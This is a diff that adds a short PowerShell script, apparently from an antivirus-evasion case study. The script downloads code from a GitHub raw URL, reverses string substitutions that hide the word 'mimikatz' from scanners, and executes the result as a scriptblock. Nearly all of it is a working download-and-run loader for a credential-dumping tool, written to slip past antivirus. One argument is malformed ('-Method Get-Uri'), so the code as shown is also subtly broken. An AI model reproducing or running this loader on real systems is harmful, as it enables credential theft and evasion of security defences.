@@ -1,0 +1,10 @@
+﻿# ONLINE! MAKE SURE SOURCE CODE AS CLEAN AS POSSIBLE!
+# REF.(SECTION "TONY G"): https://www.blackhillsinfosec.com/bypass-anti-virus-run-mimikatz/ 
+# Invoke-CList
+
+$strSourceUrl = "https://raw.githubusercontent.com/abanakiya/CaseStudy_Invoke-Mimikatz/master/clist/clist.txt"
+$strCode = Invoke-RestMethod -Method Get-Uri $strSourceUrl
+$strCode = $strCode -replace "Nooote", "NoteProperty"
+$strCode = $strCode -replace "meemeemeow", "mimikatz"
+$strCode = [scriptblock]::Create($strCode)
+.$strCode
